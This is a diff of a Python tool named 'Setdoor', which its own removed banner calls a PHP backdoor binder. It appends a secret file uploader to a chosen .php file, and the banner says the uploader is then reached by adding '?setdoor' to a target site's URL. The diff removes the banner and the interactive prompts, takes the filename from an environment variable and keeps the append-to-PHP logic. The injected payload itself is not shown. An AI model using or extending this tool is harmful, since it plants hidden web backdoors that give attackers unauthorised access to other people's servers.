@@ -1,34 +1,11 @@
 #!/usr/bin/env python
-import random
 import os.path
-
-colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m']
-color = ['\033[2;36m', '\033[2;35m', '\033[2;34m', '\033[2;33m', '\033[2;32m', '\033[2;31m']
-print(random.choice(colors))
-
-print("▞▀▖   ▐    ▌",random.choice(colors))
-print("▚▄ ▞▀▖▜▀ ▞▀▌▞▀▖▞▀ ▙▀▖",random.choice(colors))
-print("▖ ▌▛▀ ▐ ▖▌ ▌▌ ▌▌ ▌▌",random.choice(colors))
-print("▝▀ ▝▀▘ ▀ ▝▀▘▝▀ ▝▀ ▘",random.choice(colors))
-print("<======================================================>")
-print("     This is a Simple Php Backdoor Binder          ")
-print("          Use this to bind a \nsecret file uploader to your .php file ")       
-print("  Author © https://github.com/ShinazBinShajahan/ ")
-print("<======================================================>")
-print(random.choice(color))
-print("<======================================================>")
-print(":::::Uploaded Backdoor can be Accessed by :::::\n:::::adding \"?setdoor\" to the URL after :::::::\n:::::uploading your file to the server ::::::::\n example :: Yourtargetsite.com/yourfile.php?setfile")
-print("<======================================================>")
-print("\033[1;37m")
-os.system('sh importfile.sh')
 
 count = 1
 while count < 10:
     print("\033[1;37m")
     print("\033[40m")
-    filename = input("Enter your File's Name here>>> ")
-    while not filename:
-        filename = input("File Name cannot be Empty , Enter A Valid File Name >>> ")
+    filename = os.environ["name"]
     if os.path.isfile(filename) : 
         if filename.endswith('.php'):
             with open(filename, 'a') as f:
@@ -45,7 +22,7 @@ while count < 10:
                 elif exiter=="n":
                     count = 3
                 else :
-                    print("Invalid input , Exiting..........!")
+                    print("Invalid File , Exiting..........!")
                     count=30
         else :
             print("\033[1;31m")
@@ -58,7 +35,7 @@ while count < 10:
             elif exiter =="n" :
                 count = 3
             else :
-                print("Invalid input , Exiting..........!")
+                print("Invalid File , Exiting..........!")
                 count = 30
     else : 
         print("\033[1;31m")
@@ -72,7 +49,7 @@ while count < 10:
             print("Thank you for using Setdoor \nExiting..........!")
             count = 20
         else :
-            print("Invalid input , Exiting..........!")
+            print("Invalid File , Exiting..........!")
             count = 30
 #this is a simple script made by Shinaz Bin Shajahan
 #please give credits if you copy the script
